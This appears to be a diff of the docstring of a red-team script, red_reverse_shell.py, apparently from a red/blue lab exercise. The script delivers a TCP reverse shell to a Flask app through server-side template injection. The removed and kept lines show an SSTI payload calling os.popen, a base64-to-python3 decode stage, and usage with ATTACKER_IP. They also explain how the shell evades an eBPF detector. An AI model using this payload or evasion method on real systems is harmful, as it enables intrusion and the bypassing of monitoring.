@@ -1,43 +1,17 @@
 #!/usr/bin/env python3
 """
 red_reverse_shell.py - TCP Reverse Shell via SSTI (eBPF v1 Bypass)
-================================================================================
-MITRE ATT&CK : T1059.006  T1190  T1095  T1571
-Kill Chain    : Phase 5 — Evasion after Blue Team Detection
+MITRE ATT&CK: T1059.006, T1190, T1095, T1571
 
-WHY THIS BYPASSES eBPF v1:
---------------------------
-Blue Team v1 (blue_ebpf_mdr.py) hooks three syscalls:
-  1. memfd_create  → fileless staging detector
-  2. execve        → /proc/fd execution detector
-  3. socket(RAW)   → raw ICMP covert channel detector
+Standard TCP reverse shell delivered through SSTI injection.
+Bypasses eBPF v1 hooks because it uses only regular syscalls
+(connect, dup2, pty.spawn) -- no memfd_create, no raw sockets.
 
-This reverse shell uses NONE of those:
-  - socket(AF_INET, SOCK_STREAM, 0)  → regular TCP, not SOCK_RAW
-  - connect()                          → outbound TCP, not monitored by v1
-  - dup2()                             → redirect stdio, not monitored by v1
-  - pty.spawn("/bin/bash")             → normal execve of /bin/bash, not /proc/fd
-
-The entire attack uses standard, legitimate syscalls that v1 ignores.
-
-Delivery chain (3 stages):
-
-  Stage 1 — SSTI Injection (same as red_attacker.py)
-    {{ config.__class__.__init__.__globals__['os'].popen('...') }}
-
-  Stage 2 — Base64 Decode Pipeline
-    echo <B64> | base64 -d | python3
-
-  Stage 3 — Reverse Shell (no memfd_create)
-    fork()           → parent exits so Flask returns the HTTP response
-    socket.connect() → regular TCP connection back to attacker
-    dup2(fd, 0/1/2)  → redirect stdin/stdout/stderr to the socket
-    pty.spawn()      → interactive bash shell over TCP
+Delivery: SSTI -> base64 decode -> fork + connect + dup2 + pty.spawn
 
 Usage:
   python3 red_reverse_shell.py -t TARGET_IP -l ATTACKER_IP
   python3 red_reverse_shell.py -t TARGET_IP -l ATTACKER_IP --payload-only
-================================================================================
 """
 import base64
 import urllib.parse
